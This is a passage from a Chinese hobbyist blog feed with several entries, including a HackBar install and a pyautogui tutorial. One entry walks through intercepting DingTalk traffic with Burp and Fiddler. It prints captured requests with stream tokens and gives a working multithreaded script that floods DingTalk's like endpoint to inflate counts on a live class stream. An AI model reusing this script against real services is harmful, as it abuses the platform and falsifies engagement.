1</span><br><span class="line">    ;;</span><br><span class="line">esac</span><br><span class="line">exit 0</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h2 id="3、测试可执行代码"><a href="#3、测试可执行代码" class="headerlink" title="3、测试可执行代码"></a>3、测试可执行代码</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo chmod 755 &#x2F;etc&#x2F;init.d&#x2F;sunny</span><br><span class="line">sudo &#x2F;etc&#x2F;init.d&#x2F;sunny start</span><br><span class="line">sudo &#x2F;etc&#x2F;init.d&#x2F;sunny start    #启动</span><br><span class="line">sudo &#x2F;etc&#x2F;init.d&#x2F;sunny stop     #停止</span><br><span class="line">sudo &#x2F;etc&#x2F;init.d&#x2F;sunny restart  #重启</span><br></pre></td></tr></table></figure>
<h2 id="4、设置开机启动"><a href="#4、设置开机启动" class="headerlink" title="4、设置开机启动"></a>4、设置开机启动</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">cd /etc/init.d</span><br><span class="line">sudo update-rc.d sunny defaults <span class="number">90</span>    <span class="comment">#加入开机启动</span></span><br><span class="line">sudo update-rc.d -f sunny remove  <span class="comment">#取消开机启动</span></span><br></pre></td></tr></table></figure>
<p><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/2020060422195522.png" alt="在这里插入图片描述"></p>
<h2 id="QQ2737977997"><a href="#QQ2737977997" class="headerlink" title="QQ2737977997"></a>QQ2737977997</h2>]]></content>
      <categories>
        <category>搭建</category>
        <category>其他</category>
      </categories>
      <tags>
        <tag>搭建</tag>
      </tags>
  </entry>
  <entry>
    <title>破解版HackBar</title>
    <url>/2020/09/13/%E7%A0%B4%E8%A7%A3%E7%89%88HackBar/</url>
    <content><![CDATA[<script src="/assets/js/DPlayer.min.js"> </script><p>github下载地址<a href="https://github.com/Mr-xn/hackbar2.1.3"></a><br><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20200913160912.png"><br>解压出来<br><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20200913161038.png"></p>
<p>打开火狐浏览器<br><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20200913161327.png"><br><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20200913161242.png"><br>打开解压的目录找到.xpi<br><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20200913161411.png"></p>
<p><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20200913161512.png"><br><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20200913161549.png"></p>
]]></content>
      <categories>
        <category>工具安装</category>
        <category>浏览器相关插件安装</category>
      </categories>
      <tags>
        <tag>安装</tag>
      </tags>
  </entry>
  <entry>
    <title>钉钉脚本编写和和思路</title>
    <url>/2021/09/09/%E8%84%9A%E6%9C%AC%E7%BC%96%E5%86%99%E6%80%9D%E8%B7%AF/</url>
    <content><![CDATA[<script src="/assets/js/DPlayer.min.js"> </script><div class="note blue no-icon flat"><h1 id="只提供学习使用-请勿非法使用"><a href="#只提供学习使用-请勿非法使用" class="headerlink" title="只提供学习使用  请勿非法使用"></a>只提供学习使用  请勿非法使用</h1></div>

<div class="note blue no-icon flat"><p>应为我河南这个疫情比较严重，闲着没有事情在家上网课，就看见这个赞挺好玩</p>
</div>

<div class="note blue no-icon flat"><p>昨天我在老师钉钉直播叫赞刷到了20多亿，应为int类型的最大值<code>2147483647</code>所以赞最多只能刷到<code>2147483647</code>到后面赞就不显示了</p>
<p>下面我就分享一下我的思路</p>
<p><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/Zhao-sai-sai/Picture/a.png" alt="a"></p>
</div>



<h1 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h1><div class="note blue no-icon flat"><p>首先得判断他是怎么进行点赞增加的，可以抓包进行测试看看</p>
</div>

<div class="note blue no-icon flat"><p>用wireshark进行抓包，发是被加了密的，看不出来是什么东西</p>
</div>



<p><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/Zhao-sai-sai/Picture/image-20210909150805431.png" alt="image-20210909150805431"></p>
<div class="note blue no-icon flat"><p>用burp suite工具截断代理，通过伪造证书进行https解密<br>原理，证书内容都是一样的，就是公钥信息是不同的，请求的内容截断代理会吧自己的私钥，解密会话密钥，会话密钥在解密出成明文数据内容</p>
</div>

<p>生成证书</p>
<p><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/Zhao-sai-sai/Picture/image-20210909153013973.png" alt="image-20210909153013973"></p>
<p><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/Zhao-sai-sai/Picture/image-20210909153116700.png" alt="image-20210909153116700"></p>
<p><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/Zhao-sai-sai/Picture/image-20210909153133578.png" alt="image-20210909153133578"></p>
<p>我叫代理设置成自己的物理机的ip，应为我钉钉是在虚拟机里面测试的</p>
<p><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/Zhao-sai-sai/Picture/image-20210909151701656.png" alt="image-20210909151701656"></p>
<p>钉钉代理设置下面这样，直接设置系统代理掺杂了其他应用的数据包分析去了比较麻烦</p>
<p><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/Zhao-sai-sai/Picture/image-20210909152249660.png" alt="image-20210909152249660"></p>
<p>我测试可以看见burp是可以进行抓取到数据包的</p>
<p><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/Zhao-sai-sai/Picture/image-20210909152421031.png" alt="image-20210909152421031"></p>
<p>发现登录的时候他报错了，他登录的时候可能不是用的http/https协议没有办法啊</p>
<p><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/Zhao-sai-sai/Picture/image-20210909155537305.png" alt="image-20210909155537305"></p>
<div class="note blue no-icon flat"><p>他这个钉钉有好几种代理，但是我看见了浏览器代理，应为浏览器都是走的http/https协议的</p>
</div>

<p>但是他这个代理不能输出地址端口</p>
<p><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/Zhao-sai-sai/Picture/image-20210909155942607.png" alt="image-20210909155942607"></p>
<p>我就怀疑是能不能设置系统代理他就可以了，发就是设置系统代理，然后他就会自动填充</p>
<p><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/Zhao-sai-sai/Picture/image-20210909160127548.png" alt="image-20210909160127548"></p>
<p>测试还是可以连接到服务器端</p>
<p><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/Zhao-sai-sai/Picture/image-20210909160229653.png" alt="image-20210909160229653"></p>
<p>但是登录还登录不上去</p>
<p><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/Zhao-sai-sai/Picture/image-20210909162103845.png" alt="image-20210909162103845"></p>
<div class="note blue no-icon flat"><p>我用wireshark查看他是什么协议进行请求的，系统还是用的burp代理，wireshark监听网卡的全部流量,,</p>
</div>

<p>登录应该是用的这个，burp应该是抓取不了的</p>
<p><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/Zhao-sai-sai/Picture/image-20210909163304441.png" alt="image-20210909163304441"></p>
<div class="note blue no-icon flat"><p>代理手机进行抓包用burp看看能不能抓到</p>
<p>先叫burp的证书安装上</p>
</div>



<p><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/Zhao-sai-sai/Picture/image-20210909164551052.png" alt="image-20210909164551052"></p>
<p><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/Zhao-sai-sai/Picture/image-20210909164749011.png" alt="image-20210909164749011"></p>
<p><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/Zhao-sai-sai/Picture/image-20210909164803470.png" alt="image-20210909164803470"></p>
<p><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/Zhao-sai-sai/Picture/image-20210909164852336.png" alt="image-20210909164852336"></p>
<p><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/Zhao-sai-sai/Picture/image-20210909164906624.png" alt="image-20210909164906624"></p>
<p>设置手机wifi代理</p>
<p><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/Zhao-sai-sai/Picture/image-20210909165008330.png" alt="image-20210909165008330"></p>
<p>还是抓不到</p>
<p><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/Zhao-sai-sai/Picture/image-20210909170515518.png" alt="image-20210909170515518"></p>
<p>burp我是真的想不到有什么方法可以获取数据包了</p>
<div class="note blue no-icon flat"><p>Fiddler数据包抓取，也算是一个web代理工具，可以进行http/https</p>
<p>也可以解密HTTPS的，安装自己的证书</p>
</div>

<p>这个软件是</p>
<p><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/Zhao-sai-sai/Picture/image-20210909171635715.png" alt="image-20210909171635715"></p>
<p>使用浏览器代理</p>
<p><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/Zhao-sai-sai/Picture/image-20210909171828752.png" alt="image-20210909171828752"></p>
<p>可以正常登录</p>
<p><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/Zhao-sai-sai/Picture/image-20210909171943369.png" alt="image-20210909171943369"></p>
<div class="note blue no-icon flat"><p>进入直播间</p>
<p>发现时不时的都会发出这个请求</p>
</div>



<p><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/Zhao-sai-sai/Picture/image-20210910170127257.png" alt="image-20210910170127257"></p>
<p>查看一下原文</p>
<p><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/Zhao-sai-sai/Picture/image-20210909172707005.png" alt="image-20210909172707005"></p>
<p>分析一下文件，可以看见这个请求的参数非常多</p>
<p>发现每次请求头里面都有一个<strong>Referer</strong> ，感觉赞肯定给这个有关</p>
<p><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/Zhao-sai-sai/Picture/image-20210910170430686.png" alt="image-20210910170430686"></p>
<p>看一下，发现是一个直播</p>
<p><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/Zhao-sai-sai/Picture/image-20210910170934252.png" alt="image-20210910170934252"></p>
<p>他应该是一个m3u8直播的，只是判断，可以看见下面请求里面有一个<code>http://dtlive-sz-hls.dingtalk.com/live/fe97ec3a-96ac-498e-a6c3-885ff4498980.m3u8?auth_key=1633855156-0-0-d5b07d9b69bf93d1f51553a6a8fa920d&amp;cid=a7ab5d9d3b265c490b83128c67899de4&amp;token2=b4a83c70b58ad52e3e6f0c5b873b348f9XPSIyZYnsdWzV4zbkAvnoTMJEscAWVZ90m8380nhi21PfKkKTtYJ33Z-YDjEY0Np6YSfi0wYCNslAra0aqxPAqYX5wcpaTn58FUxWF_URI=</code></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">GET /r.png?f=b&amp;uid=8b95c60b-3b5f-40f9-b44f-76abaa27f883&amp;userNick=614223570&amp;times=1&amp;_t=8244137689&amp;tag=6.0.26-Release.9039987&amp;type=log&amp;msg=[live-playback-room][/r/Adaptor/LiveStream/getLiveDetail success][response]&#123;&quot;liveInfo&quot;:&#123;&quot;liveUuid&quot;:&quot;fe97ec3a-96ac-498e-a6c3-885ff4498980&quot;,&quot;anchorId&quot;:614223570,&quot;title&quot;:&quot;群直播 2021-09-10&quot;,&quot;coverUrl&quot;:&quot;https://dtlive-sz.oss-cn-shenzhen.aliyuncs.com/cover/fe97ec3a-96ac-498e-a6c3-885ff4498980_group_live_cover.jpg&quot;,&quot;inputStreamUrl&quot;:&quot;rtmp://dtlive-sz-push.dingtalk.com/live/fe97ec3a-96ac-498e-a6c3-885ff4498980?auth_key=1633855051-0-0-114d4efc70cb3d8df0550c9e5a6462d1&quot;,&quot;status&quot;:1,&quot;isLandscape&quot;:0,&quot;codeLevel&quot;:3,&quot;isLiveAbord&quot;:0,&quot;publicLandingUrl&quot;:&quot;https://h5.dingtalk.com/group-live-share/index.htm?encCid=a7ab5d9d3b265c490b83128c67899de4&amp;liveUuid=fe97ec3a-96ac-498e-a6c3-885ff4498980&quot;,&quot;viewerShareType&quot;:0,&quot;disableThumbup&quot;:false,&quot;linkMicType&quot;:0,&quot;anchorReportStatusList&quot;:[],&quot;anchorDevice&quot;:&quot;Android&quot;,&quot;enableH265&quot;:false,&quot;liveInteractionSetting&quot;:&#123;&quot;disableThumbup&quot;:false,&quot;ext&quot;:&#123;&#125;&#125;,&quot;recordSeenLevel&quot;:0&#125;,&quot;statistics&quot;:&#123;&quot;memberCount&quot;:0,&quot;pv&quot;:6,&quot;uv&quot;:0,&quot;onlineCount&quot;:0,&quot;praiseCount&quot;:0,&quot;messageCount&quot;:0,&quot;viewerCount&quot;:0&#125;,&quot;liveUrlHls&quot;:&quot;http://dtlive-sz-hls.dingtalk.com/live/fe97ec3a-96ac-498e-a6c3-885ff4498980.m3u8?auth_key=1633855156-0-0-d5b07d9b69bf93d1f51553a6a8fa920d&amp;cid=a7ab5d9d3b265c490b83128c67899de4&amp;token2=b4a83c70b58ad52e3e6f0c5b873b348f9XPSIyZYnsdWzV4zbkAvnoTMJEscAWVZ90m8380nhi21PfKkKTtYJ33Z-YDjEY0Np6YSfi0wYCNslAra0aqxPAqYX5wcpaTn58FUxWF_URI=&quot;&#125;&amp;sampling=1&amp;monitorType=prodCommonXflush&amp;monitorGroupType=live&amp;spm=dd.live.public.share&amp;sdkType=dingRetcodeSdk HTTP/1.1</span><br><span class="line">Host: retcode.taobao.com</span><br><span class="line">Connection: keep-alive</span><br><span class="line">User-Agent: Mozilla/<span class="number">5.0</span> (Windows NT <span class="number">10.0</span>; WOW64) AppleWebKit/<span class="number">537.36</span> (KHTML, like Gecko) Chrome/<span class="number">87.0</span><span class="number">.4280</span><span class="number">.141</span> Safari/<span class="number">537.36</span> dingtalk-win/<span class="number">1.0</span><span class="number">.0</span> nw(<span class="number">0.14</span><span class="number">.7</span>) DingTalk(<span class="number">6.0</span><span class="number">.26</span>-Release<span class="number">.9039987</span>) Mojo/<span class="number">1.0</span><span class="number">.0</span> Native AppType(release) Channel/<span class="number">201200</span></span><br><span class="line">Accept: image/avif,image/webp,image/apng,image/*,*/*;q=<span class="number">0.8</span></span><br><span class="line">Sec-Fetch-Site: cross-site</span><br><span class="line">Sec-Fetch-Mode: no-cors</span><br><span class="line">Sec-Fetch-Dest: image</span><br><span class="line">Referer: https://h5.dingtalk.com/group-live-share/index.htm?type=0&amp;cid=42337584319&amp;liveUuid=fe97ec3a-96ac-498e-a6c3-885ff4498980&amp;anchorId=614223570</span><br><span class="line">Accept-Encoding: gzip, deflate, br</span><br><span class="line">Accept-Language: zh-CN,zh;q=<span class="number">0.9</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>说明这个<code>fe97ec3a-96ac-498e-a6c3-885ff4498980</code>和上面的<code>liveUuid</code>就是判断直播的重要的东西</p>
<p>是可以直接就一点直播的内容给下载下来的</p>
<p><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/Zhao-sai-sai/Picture/image-20210910172248159.png" alt="image-20210910172248159"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">GET &#x2F;r.png?f&#x3D;b&amp;uid&#x3D;8b95c60b-3b5f-40f9-b44f-76abaa27f883&amp;userNick&#x3D;614223570&amp;times&#x3D;1&amp;_t&#x3D;82441376729&amp;tag&#x3D;6.0.26-Release.9039987&amp;api&#x3D;https:&#x2F;&#x2F;lv.dingtalk.com&#x2F;config&#x2F;getH5LiveConfig&amp;issucess&#x3D;true&amp;delay&#x3D;2565&amp;msg&#x3D;200&amp;detail&#x3D;success&amp;type&#x3D;retcode&amp;sampling&#x3D;1&amp;monitorType&#x3D;prodCommonXflush&amp;monitorGroupType&#x3D;live&amp;logBizType&#x3D;ddVideoLogSdk&amp;spm&#x3D;dd.live.public.share&amp;sdkType&#x3D;dingRetcodeSdk HTTP&#x2F;1.1</span><br><span class="line">Host: retcode.taobao.com</span><br><span class="line">Connection: keep-alive</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; WOW64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;87.0.4280.141 Safari&#x2F;537.36 dingtalk-win&#x2F;1.0.0 nw(0.14.7) DingTalk(6.0.26-Release.9039987) Mojo&#x2F;1.0.0 Native AppType(release) Channel&#x2F;201200</span><br><span class="line">Accept: image&#x2F;avif,image&#x2F;webp,image&#x2F;apng,image&#x2F;*,*&#x2F;*;q&#x3D;0.8</span><br><span class="line">Sec-Fetch-Site: cross-site</span><br><span class="line">Sec-Fetch-Mode: no-cors</span><br><span class="line">Sec-Fetch-Dest: image</span><br><span class="line">Referer: https:&#x2F;&#x2F;h5.dingtalk.com&#x2F;group-live-share&#x2F;index.htm?type&#x3D;0&amp;cid&#x3D;42337584319&amp;liveUuid&#x3D;fe97ec3a-96ac-498e-a6c3-885ff4498980&amp;anchorId&#x3D;614223570</span><br><span class="line">Accept-Encoding: gzip, deflate, br</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.9</span><br><span class="line"></span><br></pre></td></tr></table></figure>


<figure class="highlight"><table><tr><td class="code"><pre><span class="line">https://lv.dingtalk.com/interaction/createLike?uuid=liveUuid&amp;count=要刷的数量</span><br></pre></td></tr></table></figure>
<p>自己写了一个多线程get请求简单的脚本，下面这个脚本大概1秒就过亿赞</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">thread_func</span>():</span>  </span><br><span class="line">    r = requests.get(<span class="string">&#x27;https://lv.dingtalk.com/interaction/createLike?uuid=9659bdb5-69ec-46e3-9a35-f9beb531623d&amp;count=999999&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">threads = []</span><br><span class="line">a=<span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> range(<span class="number">1000</span>): <span class="comment"># 线程 </span></span><br><span class="line">    a = a+<span class="number">1</span></span><br><span class="line">    t = threading.Thread(target=thread_func)</span><br><span class="line">    threads.append(t)</span><br><span class="line"><span class="keyword">for</span> t <span class="keyword">in</span> threads:  </span><br><span class="line">    t.start()</span><br></pre></td></tr></table></figure>
<p><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/Zhao-sai-sai/Picture/image-20210909185437891.png" alt="image-20210909185437891"></p>
<h1 id="最笨的方法"><a href="#最笨的方法" class="headerlink" title="最笨的方法"></a>最笨的方法</h1><div class="note blue no-icon flat"><p>这个方法只能刷大概几万，就是用<code>Python</code>的<code>pyautogui</code>库进行模拟鼠标点击，而且还不能多线程进行点击</p>
</div>

<div class="note blue no-icon flat"><p><code>pyautogui</code>这个库大部分都是写一些自动化的脚步，比如游戏辅助，自动化刷办公，只要是鼠标键盘操作的都可以实现</p>
</div>

<div class="note blue no-icon flat"><p>他的基本的使用</p>
</div>

<h2 id="屏幕操作"><a href="#屏幕操作" class="headerlink" title="屏幕操作"></a>屏幕操作</h2><h3 id="获得屏幕分辨率"><a href="#获得屏幕分辨率" class="headerlink" title="获得屏幕分辨率"></a>获得屏幕分辨率</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">print(pyautogui.size())</span><br></pre></td></tr></table></figure>
<p><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/Zhao-sai-sai/Picture/image-20210909193426775.png" alt="image-20210909193426775"></p>
<p><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/Zhao-sai-sai/Picture/image-20210909193532129.png" alt="image-20210909193532129"></p>
<h3 id="屏幕截图"><a href="#屏幕截图" class="headerlink" title="屏幕截图"></a>屏幕截图</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a = pyautogui.screenshot()</span><br><span class="line">a.save(<span class="string">&#x27;要截图的名字&#x27;</span>)</span><br></pre></td></tr></table></figure>
<p><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/Zhao-sai-sai/Picture/image-20210909193913485.png" alt="image-20210909193913485"></p>
<p><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/Zhao-sai-sai/Picture/image-20210909193932278.png" alt="image-20210909193932278"></p>
<h3 id="位置定位"><a href="#位置定位" class="headerlink" title="位置定位"></a>位置定位</h3><p><code>locateOnScreen</code>方法可以获得图片的位置</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">number7_location = pyautogui.locateOnScreen(<span class="string">&#x27;要定位的图片&#x27;</span>)</span><br></pre></td></tr></table></figure>
<p>演示</p>
<p>下面我就获得我的电脑的wifi的这个地方的位置</p>
<p><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/Zhao-sai-sai/Picture/image-20210909194333942.png" alt="image-20210909194333942"></p>
<p>先叫这个图给截图下来</p>
<p><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/Zhao-sai-sai/Picture/image-20210909194459481.png" alt="image-20210909194459481"></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pyautogui </span><br><span class="line"></span><br><span class="line">number7_location = pyautogui.locateOnScreen(<span class="string">&#x27;a.png&#x27;</span>)   <span class="comment"># locateOnScreen获得图片的位置</span></span><br><span class="line">button7location = pyautogui.center(number7_location) <span class="comment"># 叫x,y输出出来</span></span><br><span class="line">print(button7location)  <span class="comment"># 返回屏幕所在位置</span></span><br></pre></td></tr></table></figure>
<p><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/Zhao-sai-sai/Picture/image-20210909194927385.png" alt="image-20210909194927385"></p>
<h2 id="鼠标操作"><a href="#鼠标操作" class="headerlink" title="鼠标操作"></a>鼠标操作</h2><ul>
<li><p>鼠标位置</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">print(pyautogui.position()) <span class="comment">#获得当前的鼠标的位置</span></span><br></pre></td></tr></table></figure>
<p><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/Zhao-sai-sai/Picture/image-20210909195243167.png" alt="image-20210909195243167"></p>
</li>
<li><p>鼠标点击</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">pyautogui.click(点击的位置x是int类型的,点击的位置y是int类型的)</span><br></pre></td></tr></table></figure>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">pyautogui.click(点击的位置x是int类型的,点击的位置y是int类型的,button=<span class="string">&#x27;left&#x27;</span>) <span class="comment"># 单击左键</span></span><br></pre></td></tr></table></figure>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">pyautogui.click(点击的位置x是int类型的,点击的位置y是int类型的,button=<span class="string">&#x27;middle&#x27;</span>)  <span class="comment"># 单击中间</span></span><br></pre></td></tr></table></figure>

  <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">pyautogui.click(点击的位置x是int类型的,点击的位置y是int类型的,button=<span class="string">&#x27;right&#x27;</span>)  <span class="comment"># 单击右键</span></span><br></pre></td></tr></table></figure>
  <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">pyautogui.doubleClick(点击的位置x是int类型的,点击的位置y是int类型的)  <span class="comment"># 指定位置，双击左键</span></span><br></pre></td></tr></table></figure>
  <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">pyautogui.middleClick(点击的位置x是int类型的,点击的位置y是int类型的)  <span class="comment"># 指定位置，双击中键</span></span><br></pre></td></tr></table></figure>
  <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">pyautogui.rightClick(点击的位置x是int类型的,点击的位置y是int类型的)   <span class="comment"># 指定位置，双击右键</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>鼠标控制拖动事件</p>
<ul>
<li><p>按当指定位置拖动动</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">pyautogui.dragTo(点击的位置x是int类型的,点击的位置y是int类型的,duration=拖动需要的时)  </span><br></pre></td></tr></table></figure>
<div class="hide-toggle" ><div class="hide-button toggle-title" style=""><i class="fas fa-caret-right fa-fw"></i><span>演示</span></div>
    <div class="hide-content"><p><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/Zhao-sai-sai/Picture/1.gif"></p>
</div></div>
</li>
<li><p>按当前鼠标位置拖动</p>
  <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">pyautogui.dragTo(点击的位置x是int类型的,点击的位置y是int类型的,duration=拖动需要的时间) </span><br></pre></td></tr></table></figure>

  <div class="hide-toggle" ><div class="hide-button toggle-title" style=""><i class="fas fa-caret-right fa-fw"></i><span>演示</span></div>
    <div class="hide-content"><p><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/Zhao-sai-sai/Picture/20-06-35.png"></p>
</div></div>
</li>
</ul>
</li>
<li><p>鼠标点击释放</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">pyautogui.mouseDown()   <span class="comment"># 鼠标的按下</span></span><br><span class="line">pyautogui.mouseUp()    <span class="comment"># 鼠标的放开</span></span><br></pre></td></tr></table></figure>



</li>
</ul>
<h2 id="下面是我写的简单的一个点赞的脚本"><a href="#下面是我写的简单的一个点赞的脚本" class="headerlink" title="下面是我写的简单的一个点赞的脚本"></a>下面是我写的简单的一个点赞的脚本</h2><p>代码</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pyautogui</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">50</span>):</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    number7_location = pyautogui.locateOnScreen(<span class="string">&#x27;f.png&#x27;</span>)  <span class="comment"># 传入按钮的图片</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>  number7_location!=<span class="string">&quot;None&quot;</span>:</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            button7location=pyautogui.center(number7_location)</span><br><span class="line">            print(button7location)  <span class="comment"># 返回屏幕所在位置</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">20</span>):</span><br><span class="line"></span><br><span class="line">                pyautogui.doubleClick(button7location)</span><br><span class="line">        <span class="keyword">except</span> TypeError:</span><br><span class="line">            print(<span class="string">&quot;没有找到位置！&quot;</span>)</span><br></pre></td></tr></table></figure>


<div class="hide-toggle" ><div class="hide-button toggle-title" style=""><i class="fas fa-caret-right fa-fw"></i><span>演示</span></div>
    <div class="hide-content"><p><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/Zhao-sai-sai/Picture/adasdasdas.gif"></p>
</div></div>



]]></content>
      <categories>
        <category>脚本编写</category>
      </categories>
      <tags>
        <tag>钉钉</tag>
      </tags>
  </entry>
  <entry>
    <title>解决显卡问题，kali启动死循环&quot; 5.921.261] nouveau 0000:01:00.0:&quot;</title>
    <url>/2020/08/30/%E8%A7%A3%E5%86%B3%E6%98%BE%E5%8D%A1%E9%97%AE%E9%A2%98/</url>
    <content><![CDATA[<script src="/assets/js/DPlayer.min.js"> </script><p>我的笔记本是winodws10和kali双系统<br>启动kali出现死循环5.921.261] nouveau 0000:01:00.0: fifo: SCHED_ERROR 06 ，就算重新装kali也是这个问题 ，根本就进不去系统,研究了多个深夜，<br><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200511105630754.jpeg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_emhhb19zZV9haS5naXRlZS5pbw==,size_20,color_006400,t_70"></p>
<p>我花了很长时间琢磨摸索研究是什么问题，终于叫这个问题给解决了</p>
<h2 id="摸索过程"><a href="#摸索过程" class="headerlink" title="摸索过程"></a>摸索过程</h2><p>，win10独立显卡驱动安装不上就算是安装上了，也不能用，报43错误，官方最新驱动以前的老驱动，重做系统，win10还是这样，我估计是独立显卡坏了，</p>
<p>，启动kali无线<strong>5.921.261] nouveau 0000:01:00.0: fifo: SCHED_ERROR 06</strong> ，是显卡驱动nouveau  ，<br>然后我在百度上找了很多资料，<br>刚开始kali是好的，然后突然就出现了这个问题，有大神说可能所引导没有安装好，从新安装kali，也是没有解决这个问题，我想可能是我的镜像有问题，我计算了他的值和官方的值一样，说明镜像是没有问题的，找了很多方法，还是没有解决，已经到了深夜了，我最后看了一篇文字，<a href="https://blog.csdn.net/yaorengjin0808/article/details/81613331">https://blog.csdn.net/yaorengjin0808/article/details/81613331</a> 用了这个方法发现可以进入系统了，应为kali2020系统GRUB内核参数有变动，下面是我研究了好长时间，</p>
<h2 id="解决方法"><a href="#解决方法" class="headerlink" title="解决方法"></a>解决方法</h2><ol>
<li><p>进入系统，叫你选系统的时候按e键，进入编辑模式，</p>
</li>
